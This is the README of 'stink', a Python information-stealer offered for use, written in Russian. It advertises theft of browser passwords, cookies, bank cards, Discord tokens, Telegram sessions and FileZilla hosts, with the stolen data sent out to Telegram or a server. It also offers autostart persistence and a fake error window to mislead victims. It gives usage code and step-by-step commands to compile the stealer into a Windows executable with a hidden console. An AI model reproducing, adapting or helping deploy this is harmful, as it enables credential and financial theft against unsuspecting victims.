# stink

Стиллер всего лишь в несколько строк с отправкой в Telegram / Server.

**Wiki:** https://github.com/FallenAstaroth/stink/wiki

## Описание
`stink` уже имеет внушительный функционал, который будет только расширяться.

## Навигация
* [Текущие возможности](#Текущие-возможности)
* [Пример использования](#Пример-использования)
  * [Стандартный](#Стандартный)
  * [Определённые модули](#Определённые-модули)
  * [Дополнительные параметры](#Дополнительные-параметры)
* [Создание exe](#Создание-exe)
  * [Создание исполняемого файла](#Создание-исполняемого-файла)
  * [С помощью BAT](#С-помощью-BAT)
  * [С помощью CMD](#С-помощью-CMD)

### Текущие возможности
1. Поддержка следующих браузеров:
   - Chrome
   - Opera
   - Opera GX
   - Edge
   - Brave
   - Vivaldi
2. Сбор следующих данных:
   - Скриншот
   - Куки
   - Пароли
   - Банковские карты
   - История
   - Закладки
   - IP-адрес
   - Конфигурация системы
   - Активные процессы
   - Токены Discord
   - Сессии Telegram
   - Хосты FileZilla
3. Поддержка мультипрофилей браузера.
4. Отправка архива собранных данных в Telegram / Server.
5. Выполнение в отдельном потоке.
6. Выполнение с использованием многопроцессорности.
7. Возможность добавления в автозагрузку.
8. Вывод окна с фейковой ошибкой.

## Пример использования
### Стандартный
```python
from stink import Stealer
from stink.utils.senders import TelegramSender

if __name__ == '__main__':
    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```
### Определённые модули

Пример со сбором только системных данных и скриншота.
```python
from stink import Stealer
from stink.enums import Features
from stink.utils.senders import TelegramSender

if __name__ == '__main__':
    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
```
### Дополнительные параметры

- `features` - включает модули из списка.

  - `passwords` - сбор паролей.

  - `cookies` - сбор куки.

  - `cards` - сбор банковских карт.

  - `history` - сбор истории поиска.

  - `bookmarks` - сбор закладок.

  - `processes` - сбор активных процессов.

  - `system` - сбор конфигурации системы.

  - `screen` - скриншот.

  - `discord` - сбор токенов Discord.

  - `telegram` – сбор сессий Telegram.

  - `filezilla` – сбор хостов FileZilla.

Передавайте если нужно включить только определенные модули. Модули для списка можно импортировать из `stink.enums.Features`.

- `utils` - включает утилиты из списка.

  - `errors` - вывод ошибок.

  - `autostart` - добавление в автозагрузку.

  - `message` - вывод фейкового окна ошибки.

Передавайте если нужно включить дополнительные утилиты. Утилиты для списка можно импортировать из `stink.enums.Utils`.

## Создание exe
Python является интерпретируемым языком программирования, поэтому мы сначала транслируем его в C, а затем скомпилируем в .exe файл.
Для этого нам понадобится Nuitka.

### Создание исполняемого файла

1. [Скачиваем](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) архив.
2. Распаковываем архив и переходим в директорию stink-master.
3. Создаем test.py (или любое другое название) файл в этой же директории со следующим кодом:
```python
from stink import Stealer
from stink.utils.senders import TelegramSender

if __name__ == '__main__':
    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```

### С помощью BAT
1. Запускаем compiler.bat.

### С помощью CMD
1. Открываем `cmd`.
2. Прописываем команду:
```
pip install virtualenv
```
3. Переходим в папку с файлом `test.py`:
```
cd path\to\file
```
4. Создаем виртуальное окружение и активируем его:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Устанавливаем зависимости:
```
pip install -r requirements.txt
```
6. Устанавливаем Nuitka:
````
pip install Nuitka==0.6.16.4
````
7. Для уменьшения размера файла дополнительно устанавливаем Zstandard (опционально):
```
pip install zstandard==0.17.0
```
8. Прописываем команду:
```
nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
```

После выполнения команды получаем test.exe файл со скрытой консолью.
